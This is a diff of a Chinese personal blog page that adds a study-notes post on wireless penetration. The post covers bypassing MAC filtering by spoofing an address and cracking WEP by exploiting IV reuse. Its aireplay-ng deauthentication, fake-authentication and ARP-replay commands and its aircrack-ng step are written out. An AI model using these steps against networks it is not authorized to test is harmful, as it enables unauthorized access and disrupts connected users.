@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>14 | 冯某人的个人博客</title>
+  <title>无线渗透复学（十） | 冯某人的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="14">
+  <meta name="description" content="总记书接上回。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无线渗透复学（十）">
 <meta property="og:url" content="http://yoursite.com/2020/05/02/14/index.html">
 <meta property="og:site_name" content="冯某人的个人博客">
+<meta property="og:description" content="总记书接上回。">
 <meta property="og:locale" content="ch">
 <meta property="article:published_time" content="2020-05-02T01:08:36.000Z">
-<meta property="article:modified_time" content="2020-05-02T01:08:36.754Z">
+<meta property="article:modified_time" content="2020-05-02T03:28:57.443Z">
 <meta property="article:author" content="冯某人">
+<meta property="article:tag" content="无线渗透">
+<meta property="article:tag" content="MAC地址绑定攻击">
+<meta property="article:tag" content="WEP攻击">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="冯某人的个人博客" type="application/atom+xml">
@@ -163,7 +168,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      14
+      无线渗透复学（十）
     </h1>
   
 
@@ -187,7 +192,55 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h1><p>书接上回。</p>
+<a id="more"></a>
+
+<h2 id="MAC绑定"><a href="#MAC绑定" class="headerlink" title="MAC绑定"></a>MAC绑定</h2><p><strong>修改MAC地址绕过过滤</strong>即可，不过可能上网效率不高，因为有两个相同mac地址的设备存在，会有丢包。</p>
+<h2 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h2><p>很古老的配置了。害，记一下吧。</p>
+<ul>
+<li><p>WEP密码破解原理</p>
+<ul>
+<li>IV并非完全随机</li>
+<li>每224个包可能出现一次IV重用</li>
+<li>收集大量IV之后找出相同的IV及其对应密文，分析出共享密码</li>
+</ul>
+</li>
+<li><p>ARP回包中包含IV</p>
+</li>
+<li><p>IV足够都，任何复杂程度的WEP密码都可以被破解</p>
+</li>
+</ul>
+<hr>
+<p>流程：</p>
+<ul>
+<li>抓包</li>
+<li>Deauthentication抓取XOR文件</li>
+<li>执行ARP重放</li>
+<li>Deauthentication 触发ARP数据包</li>
+<li>收集够DATA之后破解密码</li>
+</ul>
+<p>假身份验证： -0 -1</p>
+<p>可以先aireplay -0  1次 -a AP地址 -c 客户端地址 wlanXmon</p>
+<p>打掉AP和STA抓取握手文件，输出</p>
+<p>然后aireplay -1 60 -e AP名称 -y 文件名 -a APmac地址 -h 自己的mac地址</p>
+<p>ARP重放： -3</p>
+<ul>
+<li><p>先启动arp重放</p>
+<ul>
+<li>aireplay-ng -3 -b APmac地址 -h 本机网卡mac地址 wlanXmon</li>
+</ul>
+</li>
+<li><p>再用deauthentication打掉抓取arp包</p>
+<ul>
+<li>aireplay -0  X次 -a AP地址 -c 客户端地址 wlanXmon</li>
+</ul>
+</li>
+<li><p>等，也可以一边等一边破解</p>
+</li>
+<li><p>aircrack-ng wep-01.cap就行了</p>
+</li>
+</ul>
+
       
 
       
@@ -216,6 +269,25 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">无线渗透</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">MAC地址绑定攻击</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">WEP攻击</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -472,6 +544,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">AIREPLAY-NG</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">MAC地址绑定攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">WEP攻击</a>
               </li>
             
             <div class="clearfix"></div>
